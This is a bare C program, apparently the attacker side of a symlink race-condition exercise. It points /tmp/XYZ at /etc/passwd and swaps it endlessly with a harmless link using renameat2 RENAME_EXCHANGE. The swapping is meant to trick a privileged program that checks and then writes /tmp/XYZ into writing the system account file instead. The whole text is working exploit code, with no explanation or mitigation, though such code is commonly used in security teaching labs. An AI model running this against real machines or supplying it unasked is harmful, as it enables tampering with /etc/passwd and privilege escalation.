#include <stdio.h>
#include <sys/syscall.h>
#include <linux/fs.h>
#include<unistd.h>
int main()
{
symlink("/etc/passwd", "/tmp/XYZ");
symlink("/tmp/testfile", "/tmp/link2");

while(1){
        syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/link2", RENAME_EXCHANGE);
        syscall(SYS_renameat2, 0, "/tmp/link2", 0, "/tmp/XYZ", RENAME_EXCHANGE);
    }
}
